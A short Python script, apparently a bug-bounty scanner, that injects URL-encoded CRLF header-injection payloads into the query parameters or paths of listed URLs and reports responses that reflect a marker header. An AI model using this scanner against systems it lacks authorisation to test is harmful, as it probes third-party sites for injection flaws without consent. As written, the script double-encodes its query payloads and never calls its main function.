import aiohttp
import asyncio
import urllib.parse
from colorama import init, Fore

init()

g = Fore.GREEN
y = Fore.LIGHTYELLOW_EX
r = Fore.RED
reset = Fore.RESET

payloads = [
    "%0D%0AX-Sc4pihunt-Bugbounty:12345",
    "%0d%0aX-Sc4pihunt-Bugbounty:12345",
    "%250D%250AX-Sc4pihunt-Bugbounty:12345",
    "%0D%0A%0D%0AX-Sc4pihunt-Bugbounty:12345",
    "%25250D%25250AX-Sc4pihunt-Bugbounty:12345"
]

sem = asyncio.Semaphore(25)

async def scan_crlf(url, session, payload):
    try:
        async with sem:
            async with session.get(url) as response:
                for header, value in response.headers.items():
                    if "X-Sc4pihunt-Bugbounty" in header or "X-Sc4pihunt-Bugbounty" in value:
                        print(f"{g}[ CRLF INJECTION DETECTED ] {y}[ PAYLOAD: {payload}] {r}[{url}]{reset}")
    except Exception:
        pass

async def main(listDomains : str):
    task = []
    with open(listDomains, 'r') as file:
        urls = [u.strip() for u in file if u.strip()]
    
    async with aiohttp.ClientSession() as session:
        for url in urls:
            for payload in payloads:
                if "=" in url:
                    urlParsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qsl(urlParsed.query)
                    qs_injected = [(k, payload) for k,_ in qs]
                    new_query = urllib.parse.urlencode(qs_injected)
                    full_url = urllib.parse.urlunparse(urlParsed._replace(query=new_query))
                    task.append(scan_crlf(full_url, session, payload))

                elif url.endswith("/"):
                    URL = url+payload
                    task.append(scan_crlf(URL, session, payload))
                else:
                    URLL = url+"/"+payload
                    task.append(scan_crlf(URLL, session, payload))
        
        await asyncio.gather(*task)
